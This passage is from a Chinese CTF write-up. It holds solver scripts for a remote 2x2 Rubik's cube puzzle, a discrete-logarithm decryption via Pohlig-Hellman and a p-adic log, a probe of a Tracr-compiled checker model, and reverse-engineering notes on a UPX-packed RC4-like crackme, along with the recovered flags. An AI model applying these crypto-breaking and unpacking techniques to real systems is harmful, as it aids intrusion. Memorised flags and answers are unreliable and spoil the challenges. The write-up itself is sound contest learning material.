  - **表的大小**：6 步深度的二阶魔方状态大约 140 万个（内存占用几百 MB，生成耗时约 8 秒）。
  - **实时求解**：每轮拿到题目后，只需要从当前状态向前搜 **5步**。只要搜到的状态在 `LookupTable` 里，直接查表拼接路径。
- **结果**：**报错 "No solution found"**。
- **原因（关键）**：
  - 我们在重构隐藏面时，生成了多个“看起来合法”的候选状态（Candidates）。
  - 由于为了省事，代码里只取了第一个候选状态去搜。
  - 如果第一个候选状态正好是“奇偶性错误”的那个排列，它根本无法在 11 步内（甚至永远无法）还原。

#### 第三阶段：并行 BFS (Parallel Lockstep BFS) —— 最终解法

- **思路**：
  - 我们通过重构得到了 $N$ 个候选状态（通常 N 在 2 到 6 之间）。其中只有一个是真身，其他是无法还原的替身。
  - 我们不知道哪个是真的，如果挨个去试（串行），万一真身排在最后，前面的替身会浪费大量的搜索时间导致超时。
  - **优化策略**：将所有候选状态**同时**扔进 BFS 的队列里，进行**多源广度优先搜索**。
- **流程**：
  1. 队列初始内容：`[(Candidate_A, []), (Candidate_B, []), (Candidate_C, []) ...]`
  2. 大家一起向前走第 1 步，检查谁撞上了预计算表。
  3. 大家一起走第 2 步...
  4. **竞速机制**：因为题目保证有解，所以**真身**一定会撞上预计算表。而那些替身永远撞不上（或者需要远超 11 步）。
  5. 只要有**任意一个**状态撞上了表，立即停止搜索并返回路径。

------

脚本

```
#!/usr/bin/env python3
from pwn import *
import sys
import collections
import itertools
import time

context.log_level = 'info'

class FastCube:
    def __init__(self):
        self.moves = ["U", "U'", "U2", "D", "D'", "D2", 
                      "F", "F'", "F2", "B", "B'", "B2", 
                      "L", "L'", "L2", "R", "R'", "R2"]
        self.perm_table = {}
        # 预计算反向移动映射，用于快速路径拼接
        self.inv_map = {
            "U":"U'", "U'":"U", "U2":"U2", "D":"D'", "D'":"D", "D2":"D2",
            "F":"F'", "F'":"F", "F2":"F2", "B":"B'", "B'":"B", "B2":"B2",
            "L":"L'", "L'":"L", "L2":"L2", "R":"R'", "R'":"R", "R2":"R2",
        }
        self._init_perms()
        
        # 目标状态
        self.solved_state_tuple = tuple("UUUUDDDDFFFFBBBBLLLLRRRR")
        # 预计算合法角块集合
        self.valid_pieces = self._get_pieces(self.solved_state_tuple)
        
        self.lookup_table = {}

    def _rotate_face_indices(self, state, face_idx, cw=True):
        base = face_idx * 4
        s = list(state)
        i0, i1, i2, i3 = base, base+1, base+2, base+3
        if cw:
            s[i1], s[i3], s[i2], s[i0] = s[i0], s[i1], s[i3], s[i2]
        else:
            s[i2], s[i3], s[i1], s[i0] = s[i0], s[i2], s[i3], s[i1]
        return s

    def _init_perms(self):
        # 纯索引置换逻辑，不做额外计算
        def get_row(s, f, r): 
            base = "UDFBLR".index(f) * 4
            return [s[base + r*2], s[base + r*2 + 1]]
        def set_row(s, f, r, val):
            base = "UDFBLR".index(f) * 4
            s[base + r*2] = val[0]
            s[base + r*2 + 1] = val[1]
        def get_col(s, f, c):
            base = "UDFBLR".index(f) * 4
            return [s[base + c], s[base + 2 + c]]
        def set_col(s, f, c, val):
            base = "UDFBLR".index(f) * 4
            s[base + c] = val[0]
            s[base + 2 + c] = val[1]

        def apply(state, move):
            s = list(state)
            face = move[0]
            prime = "'" in move
            f_idx = "UDFBLR".index(face)
            s = self._rotate_face_indices(s, f_idx, not prime)
            
            if face == 'U':
                if prime:
                    t = get_row(s, 'F', 0); set_row(s, 'F', 0, get_row(s, 'L', 0)); set_row(s, 'L', 0, get_row(s, 'B', 0)); set_row(s, 'B', 0, get_row(s, 'R', 0)); set_row(s, 'R', 0, t)
                else:
                    t = get_row(s, 'F', 0); set_row(s, 'F', 0, get_row(s, 'R', 0)); set_row(s, 'R', 0, get_row(s, 'B', 0)); set_row(s, 'B', 0, get_row(s, 'L', 0)); set_row(s, 'L', 0, t)
            elif face == 'D':
                if prime:
                    t = get_row(s, 'F', 1); set_row(s, 'F', 1, get_row(s, 'R', 1)); set_row(s, 'R', 1, get_row(s, 'B', 1)); set_row(s, 'B', 1, get_row(s, 'L', 1)); set_row(s, 'L', 1, t)
                else:
                    t = get_row(s, 'F', 1); set_row(s, 'F', 1, get_row(s, 'L', 1)); set_row(s, 'L', 1, get_row(s, 'B', 1)); set_row(s, 'B', 1, get_row(s, 'R', 1)); set_row(s, 'R', 1, t)
            elif face == 'F':
                if prime:
                    t = get_row(s, 'U', 1); set_row(s, 'U', 1, get_col(s, 'R', 0)); set_col(s, 'R', 0, get_row(s, 'D', 0)[::-1]); set_row(s, 'D', 0, get_col(s, 'L', 1)); set_col(s, 'L', 1, t[::-1])
                else:
                    t = get_row(s, 'U', 1); set_row(s, 'U', 1, get_col(s, 'L', 1)[::-1]); set_col(s, 'L', 1, get_row(s, 'D', 0)); set_row(s, 'D', 0, get_col(s, 'R', 0)[::-1]); set_col(s, 'R', 0, t)
            elif face == 'B':
                if prime:
                    t = get_row(s, 'U', 0); set_row(s, 'U', 0, get_col(s, 'L', 0)[::-1]); set_col(s, 'L', 0, get_row(s, 'D', 1)); set_row(s, 'D', 1, get_col(s, 'R', 1)[::-1]); set_col(s, 'R', 1, t)
                else:
                    t = get_row(s, 'U', 0); set_row(s, 'U', 0, get_col(s, 'R', 1)); set_col(s, 'R', 1, get_row(s, 'D', 1)[::-1]); set_row(s, 'D', 1, get_col(s, 'L', 0)); set_col(s, 'L', 0, t[::-1])
            elif face == 'L':
                if prime:
                    t = get_col(s, 'U', 0); set_col(s, 'U', 0, get_col(s, 'F', 0)); set_col(s, 'F', 0, get_col(s, 'D', 0)); set_col(s, 'D', 0, get_col(s, 'B', 1)[::-1]); set_col(s, 'B', 1, t[::-1])
                else:
                    t = get_col(s, 'U', 0); set_col(s, 'U', 0, get_col(s, 'B', 1)[::-1]); set_col(s, 'B', 1, get_col(s, 'D', 0)[::-1]); set_col(s, 'D', 0, get_col(s, 'F', 0)); set_col(s, 'F', 0, t)
            elif face == 'R':
                if prime:
                    t = get_col(s, 'U', 1); set_col(s, 'U', 1, get_col(s, 'B', 0)[::-1]); set_col(s, 'B', 0, get_col(s, 'D', 1)[::-1]); set_col(s, 'D', 1, get_col(s, 'F', 1)); set_col(s, 'F', 1, t)
                else:
                    t = get_col(s, 'U', 1); set_col(s, 'U', 1, get_col(s, 'F', 1)); set_col(s, 'F', 1, get_col(s, 'D', 1)); set_col(s, 'D', 1, get_col(s, 'B', 0)[::-1]); set_col(s, 'B', 0, t[::-1])
            return s

        for m in self.moves:
            if '2' in m:
                base = m[0]
                p1 = apply(list(range(24)), base)
                p2 = apply(p1, base)
                self.perm_table[m] = p2
            else:
                self.perm_table[m] = apply(list(range(24)), m)

    def do_move(self, state_tuple, move):
        perm = self.perm_table[move]
        return tuple(state_tuple[i] for i in perm)

    def _get_pieces(self, state):
        corners = [
            (2, 17, 8), (3, 9, 20), (1, 21, 12), (0, 13, 16),
            (4, 10, 19), (5, 22, 11), (7, 14, 23), (6, 18, 15)
        ]
        pieces = []
        for c in corners:
            pieces.append("".join(sorted([state[i] for i in c])))
        return sorted(pieces)

    def is_valid_state(self, state_tuple):
        return self._get_pieces(state_tuple) == self.valid_pieces

    def _invert_path(self, path):
        return [self.inv_map[m] for m in reversed(path)]

    def precompute_table(self, depth=6):
        log.info(f"Pre-computing table up to depth {depth}...")
        start_t = time.time()
        q = collections.deque([(self.solved_state_tuple, [])])
        self.lookup_table[self.solved_state_tuple] = []
        
        # 使用 visited set 避免重复计算
        visited = {self.solved_state_tuple}
        
        for d in range(depth):
            next_q = collections.deque()
            while q:
                curr_state, path = q.popleft()
                for m in self.moves:
                    # 简单剪枝：不连续转同面
                    if path and path[-1][0] == m[0]: continue
                    
                    nxt = self.do_move(curr_state, m)
                    if nxt not in visited:
                        visited.add(nxt)
                        # 记录还原路径（path + m 的反向）
                        new_path = path + [m]
                        self.lookup_table[nxt] = self._invert_path(new_path)
                        next_q.append((nxt, new_path))
            q = next_q
            log.info(f"Depth {d+1} done.")
            
        log.success(f"Pre-computation finished in {time.time()-start_t:.2f}s. Total states: {len(self.lookup_table)}")

    def solve_candidates_parallel(self, candidates, max_moves=11):
        """
        并行搜索所有 candidates。
        只要有一个 candidate 撞到 lookup_table，立刻停止。
        """
        
        # 1. 先检查所有候选者是否直接在表中
        for cand in candidates:
            if cand in self.lookup_table:
                return " ".join(self.lookup_table[cand])

        # 2. 初始化并行BFS队列
        # Queue item: (current_state, path_so_far)
        # 我们不需要区分是哪个 candidate 带来的，因为任何一个解都是有效解
        q = collections.deque()
        visited = set()
        
        for cand in candidates:
            q.append((cand, []))
            visited.add(cand)

        # 3. 开始搜索
        # Max additional moves = max_moves - precomputed(6) = 5
        search_depth = max_moves - 6
        
        for d in range(search_depth):
            next_q = collections.deque()
            while q:
                curr, path = q.popleft()
                
                for m in self.moves:
                    # Pruning
                    if path and path[-1][0] == m[0]: continue
                    
                    nxt = self.do_move(curr, m)
                    
                    # 关键检查：是否撞库
                    if nxt in self.lookup_table:
                        final_path = path + [m] + self.lookup_table[nxt]
                        return " ".join(final_path)
                    
                    if nxt not in visited:
                        visited.add(nxt)
                        next_q.append((nxt, path + [m]))
            
            q = next_q
            if not q: break
            
        return None

def get_candidates(faces, cube_engine):
    counts = collections.defaultdict(int)
    for f in faces:
        for c in faces[f]: counts[c] += 1
    
    missing_stickers = []
    for c in "UDFBLR":
        needed = 4 - counts[c]
        if needed > 0:
            missing_stickers.extend([c] * needed)
    
    flat_state = []
    missing_indices = []
    for f in "UDFBLR":
        if f not in faces:
            base = len(flat_state)
            flat_state.extend([None] * 4)
            missing_indices.extend(range(base, base+4))
        else:
            flat_state.extend(faces[f])
            
    valid_states = []
    # 去重排列
    unique_perms = set(itertools.permutations(missing_stickers))
    
    for p in unique_perms:
        temp_state = list(flat_state)
        for i, val in enumerate(p):
            temp_state[missing_indices[i]] = val
        t = tuple(temp_state)
        if cube_engine.is_valid_state(t):
            valid_states.append(t)
            
    return valid_states

def main():
    cube = FastCube()
    # 保持 Depth 6 预计算
    cube.precompute_table(depth=6) 
    
    host = 'nc1.ctfplus.cn'
    port = 48818
    
    while True:
        try:
            r = remote(host, port)
            r.recvuntil(b"flag!\n\n", timeout=5)
            
            for round_num in range(1, 101):
                # 接收部分添加更稳健的重试
                start_recv = time.time()
                try:
                    data = r.recvuntil(b"solution:\n", timeout=3).decode()
                except EOFError:
                    log.error("Server disconnected (EOF)")
                    return
                except:
                    log.error("Receive timeout")
                    return

                # 解析
                faces = {}
                curr_face = None
                for line in data.splitlines():
                    line = line.strip()
                    if line.startswith("Face"):
                        curr_face = line.split()[1][0]
                        faces[curr_face] = []
                    elif line.startswith("|") and curr_face:
                        row = line.strip("|").split()
                        faces[curr_face].extend(row)
                
                # 重构
                candidates = get_candidates(faces, cube)
                if not candidates:
                    log.error("Reconstruction failed")
                    r.sendline(b"")
                    continue
                
                # 并行求解
                sol = cube.solve_candidates_parallel(candidates)
                
                if not sol:
                    log.error(f"Round {round_num}: No solution found")
                    r.sendline(b"")
                else:
                    # 打印一下耗时，确保我们在时间内
                    elapsed = time.time() - start_recv
                    log.info(f"Round {round_num}: {sol} (Time: {elapsed:.2f}s)")
                    r.sendline(sol.encode())
                
                # 检查结果
                try:
                    res = r.recvline(timeout=2).decode()
                    if "[-]" in res:
                        log.failure(f"Failed: {res}")
                        # 看看还有没有别的输出
                        print(r.recvall(timeout=1).decode())
                        return
                    if "FLAG" in res:
                        print("\n\n" + "!"*40)
                        print(res)
                        print("!"*40 + "\n")
                        return
                except EOFError:
                     log.error("Server disconnected checking result")
                     return

            # 如果跑完100轮
            print(r.recvall(timeout=2).decode())
            r.close()
            break 
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            log.error(f"Error: {e}")
            try: r.close()
            except: pass
            time.sleep(1)

if __name__ == "__main__":
    main()
```

```
[*] Round 89: L' U' L2 D' L F' U' L2 U' (Time: 0.00s)
[*] Round 90: U' F U R B' R2 U' B2 U (Time: 0.00s)
[*] Round 91: F L2 F' D' B R' U F R2 (Time: 0.00s)
[*] Round 92: U F' L F' U L' U' R2 U2 (Time: 0.00s)
[*] Round 93: L2 F D2 B' U L U' F' L' (Time: 0.00s)
[*] Round 94: F2 U F L2 F2 L' F U2 L2 (Time: 0.00s)
[*] Round 95: U L' F R D' R2 F U' F' (Time: 0.00s)
[*] Round 96: U L F U2 L' U F2 U' L' D2 (Time: 0.01s)
[*] Round 97: L F2 D2 R F' D L (Time: 0.00s)
[*] Round 98: U F' U B2 D2 B D L2 F (Time: 0.00s)
[*] Round 99: F U2 F' L F' U2 L U' L (Time: 0.00s)
[*] Round 100: U F2 L' F D2 B2 U B U L' (Time: 0.01s)
[+] Receiving all data: Done (88B)
[*] Closed connection to nc1.ctfplus.cn port 48818

[+] FLAG: UniCTF{G0dZzzz_NuM63r_1s_3lEv3N_But_uR_C0d3_i5_D1v1n3_GG2014636926509780992}
```

## subgroup_dlp

这题本质是：给定复合模数 (N)，密文 (c \equiv 7^m \pmod N)，求指数 (m=\text{bytes_to_long(flag)})。因为你已经拿到 (N) 的分解，所以可以把问题拆到每个素数幂模数上做“子群离散对数”，最后把各个模数下得到的 (m) 的同余用 CRT 合并回来。

------

1) 关键分解与思路

已知（来自 factordb）：
[
N = 2^5 \cdot 3^2 \cdot p_1 \cdot p_2^3 \cdot p_3
]
其中你给了：

- (p_1 = 10711086940911733573)
- (p_2 = 188455199626845780197)

剩下的 (p_3) 可以直接整除算出来：
[
p_3 = \frac{N}{2^5\cdot 3^2\cdot p_1\cdot p_2^3}
]
算得：

- (p_3 = 988854958862525695246052320176260067587096611000882853771819829938377275059)

### CRT 拆分

因为 (\gcd(7,N)=1)，所以
[
7^m \equiv c \pmod{p_i^{e_i}}
]
对每个模数分别求离散对数得到：
[
m \equiv m_i \pmod{\operatorname{ord}_{p_i^{e_i}}(7)}
]
再用（允许模数不互素的）广义 CRT 合并这些同余。

### 难点：(p_2^3) 上的“大素数幂子群”

((\mathbb{Z}/p^3\mathbb{Z})^*) 的阶是 (p^2(p-1))。这里 (p=p_2) 很大，所以 (p^2) 部分不能用普通 Pohlig-Hellman（会出现大素数因子）。
处理方式是把指数拆成：
[
m = a + \operatorname{ord}_{p}(7)\cdot b
]

- 先在模 (p) 上用 Pohlig-Hellman 解出 (a \bmod \operatorname{ord}_p(7))（因为 (p-1) 很光滑）
- 再在模 (p^3) 上对 (p^2) 子群用 3 阶截断的 p-adic log（(\log(1+t)=t-\frac{t^2}{2})，因为 (t) 含 (p) 因子）直接线性求出 (b \bmod p^2)

------

2) 直接可跑的解密脚本（无 Sage，纯 Python）

> 只依赖 `pycryptodome`（你题目本来就在用）
> **不依赖 sympy**：我把用到的阶分解也写死在脚本里（来自因子推导/光滑分解）。

```python
from Crypto.Util.number import long_to_bytes
import math

# -------------------------
# given
# -------------------------
N = 20416580311348568104958456290409800602076453150746674606637172527592736894552749500299570715851384304673805100612931000268540860237227126141075427447627491168
c = 8195229101228793312160531614487746122056220479081491148455134171051226604632289610379779462628287749120056961207013231802759766535835599450864667728106141697
g = 7

# factorization (from factordb + division)
p1 = 10711086940911733573
p2 = 188455199626845780197
p3 = N // (2**5 * 3**2 * p1 * (p2**3))
assert N == (2**5) * (3**2) * p1 * (p2**3) * p3

# -------------------------
# helpers: BSGS / PH / CRT
# -------------------------
def bsgs(base, target, mod, order):
    """Solve base^x = target (mod mod), 0<=x<order. Assumes solution exists."""
    m = math.isqrt(order) + 1
    table = {}
    e = 1
    for j in range(m):
        table.setdefault(e, j)
        e = (e * base) % mod

    factor = pow(base, -m, mod)
    gamma = target % mod
    for i in range(m + 1):
        j = table.get(gamma)
        if j is not None:
            x = i * m + j
            if x < order and pow(base, x, mod) == target % mod:
                return x
        gamma = (gamma * factor) % mod
    raise ValueError("BSGS failed")

def dlp_prime_power(base, target, mod, q, e, N):
    """Solve DLP mod q^e part inside Pohlig-Hellman."""
    x = 0
    for i in range(e):
        exp = N // (q ** (i + 1))
        gi = pow(base, exp, mod)
        hi = (target * pow(base, -x, mod)) % mod
        hi = pow(hi, exp, mod)  # now in subgroup of order q
        di = bsgs(gi, hi, mod, q)
        x += di * (q ** i)
    return x

def crt_coprime(a1, m1, a2, m2):
    """CRT for coprime moduli."""
    inv = pow(m1, -1, m2)
    k = ((a2 - a1) % m2) * inv % m2
    return a1 + k * m1, m1 * m2

def pohlig_hellman(base, target, mod, order_factors):
    """DLP in cyclic subgroup of known (smooth) order given by factorization dict."""
    N = 1
    for q, e in order_factors.items():
        N *= q ** e
    if pow(base, N, mod) != 1:
        raise ValueError("base does not have the claimed order")

    x, M = 0, 1
    for q, e in order_factors.items():
        xe = dlp_prime_power(base, target, mod, q, e, N)
        x, M = crt_coprime(x, M, xe, q ** e)
    return x % N

def crt_general(a1, m1, a2, m2):
    """General CRT (moduli not necessarily coprime)."""
    g = math.gcd(m1, m2)
    if (a2 - a1) % g != 0:
        raise ValueError("inconsistent congruences")
    l = (m1 // g) * m2
    m1g, m2g = m1 // g, m2 // g
    k = ((a2 - a1) // g) * pow(m1g, -1, m2g) % m2g
    return (a1 + m1 * k) % l, l

# -------------------------
# 1) tiny parts: mod 2^5 and 3^2
# -------------------------
# ord_32(7)=4, ord_9(7)=3
m_mod4 = next(x for x in range(4) if pow(g, x, 32) == c % 32)  # x mod 4
m_mod3 = next(x for x in range(3) if pow(g, x, 9) == c % 9)    # x mod 3

# -------------------------
# 2) prime p1: order(7) is smooth -> PH
# -------------------------
# order(7 mod p1) = 2 * 7 * 29 * 181 * 839 * 11149 * 2597047
ord_p1_f = {2: 1, 7: 1, 29: 1, 181: 1, 839: 1, 11149: 1, 2597047: 1}
ord_p1 = 1
for q, e in ord_p1_f.items():
    ord_p1 *= q ** e
m_p1 = pohlig_hellman(g % p1, c % p1, p1, ord_p1_f)

# -------------------------
# 3) prime p3: (p3-1) is B-smooth -> PH
# -------------------------
# p3-1 fully factors into small primes (all exp=1)
ord_p3_f = {
    2:1, 2903:1, 3191:1, 8093:1, 10303:1, 10903:1, 18371:1,
    35437:1, 36187:1, 36587:1, 39607:1, 41669:1, 45307:1,
    58363:1, 60899:1, 62401:1, 63559:1, 64621:1
}
ord_p3 = 1
for q, e in ord_p3_f.items():
    ord_p3 *= q ** e  # this is p3-1
m_p3 = pohlig_hellman(g % p3, c % p3, p3, ord_p3_f)

# -------------------------
# 4) prime power p2^3: split into (p-1) part and p^2 part
# -------------------------
# order(7 mod p2) is smooth:
ord_p2_f = {2: 1, 19: 1, 157: 1, 499: 1, 1498531: 1, 21121687: 1}
ord_p2 = 1
for q, e in ord_p2_f.items():
    ord_p2 *= q ** e

# (a) solve a mod ord_p2 via DLP mod p2
a = pohlig_hellman(g % p2, c % p2, p2, ord_p2_f)

# (b) solve b mod p2^2 via p-adic log on subgroup generated by g^{ord_p2}
p = p2
mod_p2_3 = p ** 3
g_mod = g % mod_p2_3
h_mod = c % mod_p2_3

g1 = pow(g_mod, ord_p2, mod_p2_3)  # order p^2, and g1 ≡ 1 (mod p)
h_adj = (h_mod * pow(pow(g_mod, a, mod_p2_3), -1, mod_p2_3)) % mod_p2_3

def padic_log_div_p(u, p):
    # k=3 only: log(1+t)=t - t^2/2  (mod p^3), then divide by p to land in Z/p^2Z
    pk = p ** 3
    t = (u - 1) % pk
    inv2 = pow(2, -1, pk)
    log_mod = (t - (t * t % pk) * inv2) % pk
    return (log_mod // p) % (p ** 2)

Lg = padic_log_div_p(g1, p)
Lh = padic_log_div_p(h_adj, p)
b = (Lh * pow(Lg, -1, p ** 2)) % (p ** 2)

# exponent modulo ord_p2 * p^2
ord_p2_3 = ord_p2 * (p ** 2)
m_p2_3 = (a + ord_p2 * b) % ord_p2_3

# -------------------------
# 5) combine all congruences with general CRT
# -------------------------
x, M = m_p2_3, ord_p2_3
for (ai, mi) in [
    (m_p1, ord_p1),
    (m_p3, ord_p3),
    (m_mod4, 4),
    (m_mod3, 3),
]:
    x, M = crt_general(x, M, ai, mi)

# sanity check
assert pow(g, x, N) == c

flag_bytes = long_to_bytes(x)
# 题目里 flag 形如 UniCTF{...}，这里去掉可能出现的尾部 0x00 padding
flag = flag_bytes.split(b'}')[0] + b'}'
print(flag.decode())
```

------

3) 跑出来的 flag

脚本输出：
**`UniCTF{Th1s_DLP_probl3m_i5_v3ry_s1mpl3_f0r_y0u!!!}`**

------

## im

从你贴的输出来看，这题基本就是 **Tracr 编译出来的“判题模型”**：它只做一件事——检查你的输入是否满足一堆条件，满足就输出“正确消息”，不满足就输出第一条错误嘲讽。

你现在看到永远是这句：

> This flag is like a mismatched sock...

这非常关键：在原 aliyunctf 的 `mi` 生成器里，确实就是这么写的——`ok` 为真输出 `CORRECT_MESSAGE`，否则永远输出 `INCORRECT_MESSAGES[0]` 的逐字符切片
所以你怎么乱试都“没反馈”，因为它是 **全或无** 的 gate。

------

### 你下一步要做什么（最短路径）

### 1) 先确认这题是不是直接复用 mi 的答案

你上传的 `gen.py` 里给了两套“棋盘+标准解”：

- **10×10 示例**：`INITIAL_BOARD_EXAMPLE` + `REFERENCE_ANSWER_EXAMPLE`（刚好 100 位）
- **11×11 正式**：`INITIAL_BOARD` + `REFERENCE_ANSWER`（121 位）

而判题逻辑要求 **长度必须等于 n\*m 且每位必须是 '0'/'1'** ，坐标展开是 **行优先 i\*m+j** 。

你现在的 `__main__.py` 会 `ljust(100)`，但注意：**如果你输入 121 位，它不会截断**（`ljust` 只会补短不会变长），所以 11×11 也完全可能。

因此：最先做的就是——**把这两套标准解直接喂给你的 challenge.pkl.zst**，看看会不会立刻变 “Congratulations”。

------

### 2) 直接给你“无需参数”的一键探测脚本

把下面存成 `try_solutions.py`，和 `challenge.pkl.zst` 放同目录，直接运行即可（不需要任何参数）。

它会依次测试：

- 100 位（10×10 示例解）
- 121 位（11×11 正式解）

如果模型输出里出现 `hashlib.sha256(your_input).hexdigest()` 这种占位，它会自动把你输入做 sha256，拼出最终 flag（原生成器就是这么设计的 ）。

```python
import re
import hashlib
import pickle
import string
import types

import haiku as hk
import jax.nn
import zstandard as zstd
from tracr.compiler.assemble import AssembledTransformerModel, _make_embedding_modules
from tracr.transformer.model import CompiledTransformerModel, Transformer, TransformerConfig


# ---- same loader as your __main__.py ----
def load_model(path: str):
    with open(path, "rb") as fp, zstd.ZstdDecompressor().stream_reader(fp) as cfp:
        o = types.SimpleNamespace(**pickle.load(cfp))

    o.config["activation_function"] = getattr(jax.nn, o.config["activation_function"])

    def get_compiled_model():
        transformer = Transformer(TransformerConfig(**o.config))
        embed_modules = _make_embedding_modules(*o.embed_spaces)
        return CompiledTransformerModel(
            transformer,
            embed_modules.token_embed,
            embed_modules.pos_embed,
            embed_modules.unembed,
            use_unembed_argmax=True,
        )

    @hk.without_apply_rng
    @hk.transform
    def forward(emb):
        cmodel = get_compiled_model()
        return cmodel(emb, use_dropout=False)

    return AssembledTransformerModel(
        forward=forward.apply,
        get_compiled_model=None,  # type: ignore
        params=o.params,
        model_config=o.config,
        residual_labels=o.residual_labels,
        input_encoder=o.input_encoder,
        output_encoder=o.output_encoder,
    )


def decode_output(output):
    out = output.decoded
    if "EOS" in out:
        out = out[: out.index("EOS")]
    return "".join(out[1:])  # drop BOS


def run_once(model, s: str):
    if any(c not in string.printable for c in s):
        raise ValueError("non-printable in input")
    if len(s) > 128:
        raise ValueError("input too long (>128)")
    tokens = ["BOS"] + list(s)
    return decode_output(model.apply(tokens))  # type: ignore


def derive_flag_from_message(msg: str, user_input: str):
    """
    Supports:
    - '... flag is PREFIX{hashlib.sha256(your_input).hexdigest()} ...'
    - or already-materialized 'PREFIX{...}'
    """
    # already has {...}
    m = re.search(r"([A-Za-z0-9_]+)\{([0-9a-f]{64})\}", msg)
    if m:
        return m.group(0)

    # placeholder form
    m = re.search(r"flag is ([A-Za-z0-9_]+)\{hashlib\.sha256\(your_input\)\.hexdigest\(\)\}", msg)
    if m:
        prefix = m.group(1)
        h = hashlib.sha256(user_input.encode()).hexdigest()
        return f"{prefix}{{{h}}}"

    return None


def main():
    path = "challenge.pkl.zst"
    model = load_model(path)

    # 10x10 example (100 bits)
    s100 = (
        "0100100000"
        "0001000000"
        "1010000001"
        "0100000000"
        "0000001000"
        "0001000100"
        "0010010010"
        "1000100001"
        "0000000010"
        "0010000100"
    )

    # 11x11 reference (121 bits)
    s121 = (
        "00100010001"
        "00000001000"
        "10000100100"
        "00100000000"
        "01001010000"
        "00100100100"
        "00001010001"
        "00000000100"
        "00010100000"
        "10000000000"
        "00100000010"
    )

    for name, s in [("10x10(100)", s100), ("11x11(121)", s121)]:
        out = run_once(model, s)
        print("=" * 80)
        print(f"[{name}] len={len(s)}")
        print(out)

        flag = derive_flag_from_message(out, s)
        if flag:
            print(f"\n[+] Derived flag: {flag}")
            return

    print("\n[-] Neither reference solution triggered the correct branch.")
    print("    Then your challenge.pkl.zst is NOT using the same board/answer as the uploaded gen.py.")


if __name__ == "__main__":
    main()
```

------

```
================================================================================
[10x10(100)] len=100
This flag is like a mismatched sock, it just doesn't belong. Pair it correctly and come back.
================================================================================
[11x11(121)] len=121
Congratulations! The flag is unictf{hashlib.sha256(your_input).hexdigest()}.

[+] Derived flag: unictf{e298321ac9421d91d6e357d665ac853dd6e80f3fc9953879db9b6da830bc8ff8}

进程已结束，退出代码为 0
```

## Ez

先upx脱壳

trace  fork那里会卡，先mov eax,1跟父进程



找到check逻辑，类似rc4

改了这里

```
char __fastcall sub_404820(char *a1, char *a2)
{
  char result; // al

  *a1 = *a2;
  result = *a1;
  *a2 = *a1;
  return result;
}
```



```
_BOOL8 __fastcall check(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  const char **v3; // rcx
  int v4; // eax
  unsigned int v5; // eax
  int v6; // eax
  __int64 v8; // [rsp+0h] [rbp-D0h] BYREF
  const char *v9; // [rsp+38h] [rbp-98h]
  __int64 *v10; // [rsp+40h] [rbp-90h]
  __int64 *v11; // [rsp+48h] [rbp-88h]
  __int64 *v12; // [rsp+50h] [rbp-80h]
  __int64 *v13; // [rsp+58h] [rbp-78h]
  int v14; // [rsp+68h] [rbp-68h]
  int v15; // [rsp+6Ch] [rbp-64h]
  int v16; // [rsp+70h] [rbp-60h]
  int v17; // [rsp+74h] [rbp-5Ch]
  int v18; // [rsp+78h] [rbp-58h]
  int v19; // [rsp+7Ch] [rbp-54h]
  __int64 v20; // [rsp+80h] [rbp-50h]
  bool v21; // [rsp+8Fh] [rbp-41h]
  int v22; // [rsp+90h] [rbp-40h]
  char v23; // [rsp+96h] [rbp-3Ah]
  bool v24; // [rsp+97h] [rbp-39h]
  const char **v25; // [rsp+98h] [rbp-38h]
  void *dest; // [rsp+A0h] [rbp-30h]
  bool v27; // [rsp+AFh] [rbp-21h]

  v23 = 1;
  v24 = dword_4091C4 < 10;
  v20 = a1;
  v22 = -701638472;
  v19 = -701638472;
  v18 = 277767697;
  v17 = 0;
  v25 = (const char **)(&v8 - 2);
  dest = &v8 - 6;
  *(&v8 - 2) = a1;
  v13 = &v8 - 32;
  v12 = &v8 - 2;
  v11 = &v8 - 2;
  v10 = &v8 - 2;
  v1 = decode((__int64)"ebaqpJ4+iIiIENP6");
  *v12 = v1;
  memcpy(dest, &byte_407070, 0x30u);
  v2 = sub_4036D0(*v25);
  v3 = (const char **)v11;
  *v11 = v2;
  *v25 = *v3;
  v4 = strlen(*v25);
  *(_DWORD *)v10 = v4;
  v9 = (const char *)*v12;
  v5 = strlen(v9);
  sub_404850(v13, v9, v5);
  sub_404FB0(v13, *v25, *(unsigned int *)v10);
  v27 = *(int *)v10 == 48;
  v22 = 1446100128;
  v19 = 1446100128;
  v18 = -1869460999;
  v17 = -2147228696;
  v16 = 1776765681;
  v15 = 1016837402;
  v14 = 0;
  if ( v27 )
  {
    v22 = -330665553;
    v21 = 0;
    v19 = -330665553;
    v18 = 648740616;
    v17 = 370972919;
    v16 = 0;
    v6 = memcmp(*v25, dest, 48u);
    v22 = 1558412536;
    return v6 == 0;
  }
  else
  {
    v22 = 1558412536;
    return 0;
  }
}
```

 密文

```
unsigned char ida_chars[] =
{
  0xF4, 0xFA, 0xFB, 0xBD, 0x84, 0x73, 0xFC, 0xE8, 0x8A, 0xCD, 
  0x63, 0x84, 0xD1, 0xB7, 0x56, 0x05, 0x86, 0x8E, 0x8E, 0x05, 
  0x0C, 0x17, 0xDF, 0x94, 0xD9, 0x00, 0x3E, 0xEC, 0x21, 0xDA, 
  0x15, 0xF8, 0x9B, 0xAA, 0x8D, 0x31, 0xEC, 0xAA, 0x94, 0x98, 
  0x3F, 0xBC, 0xA4, 0xFA, 0x8A, 0x03, 0x2E, 0xF4
};
```

```
__int64 __fastcall decode(__int64 a1)
{
  unsigned __int64 i; // [rsp+58h] [rbp-38h]
  __int64 v3; // [rsp+60h] [rbp-30h]
  _QWORD v4[2]; // [rsp+68h] [rbp-28h] BYREF
  __int64 v6; // [rsp+80h] [rbp-10h]

  v4[1] = a1;
  v3 = sub_402210(a1, v4);
  v6 = v3;
  if ( !v3 )
    return 0;
  for ( i = 0; i < v4[0]; ++i )
    *(_BYTE *)(v3 + i) ^= 0x5Bu;
  *(_BYTE *)(v3 + v4[0]) = 0;
  return v3;
}
```

解密脚本

```
import base64

# ==========================================
# 1. 基础数据
# ==========================================
# 密文 (IDA byte_407070)
cipher_data = [
    0xF4, 0xFA, 0xFB, 0xBD, 0x84, 0x73, 0xFC, 0xE8, 0x8A, 0xCD,
    0x63, 0x84, 0xD1, 0xB7, 0x56, 0x05, 0x86, 0x8E, 0x8E, 0x05,
    0x0C, 0x17, 0xDF, 0x94, 0xD9, 0x00, 0x3E, 0xEC, 0x21, 0xDA,
